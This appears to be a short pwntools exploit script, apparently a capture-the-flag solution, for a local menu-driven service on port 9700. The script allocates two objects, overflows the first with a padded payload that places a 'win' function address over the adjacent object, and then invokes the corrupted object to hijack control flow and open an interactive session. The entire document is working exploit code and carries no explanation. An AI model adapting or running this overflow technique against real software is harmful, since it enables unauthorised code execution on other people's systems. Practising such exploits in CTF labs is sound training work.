from pwn import *

s = remote('localhost', 9700)

win = 0x8048660

payload = "A"*36 + p32(win)

#Two allocate
s.sendlineafter("::> ", 'c')
s.sendlineafter("::> ", 'c')

#Overflow index0
s.sendlineafter("::> ", 'b')
s.sendlineafter("id ?: ", '0')
s.sendlineafter("input_b: ", payload)

#Run object func index1(corrupted)
s.sendlineafter("::> ", 'e')
s.sendlineafter("id ?: ", '1')

s.interactive()
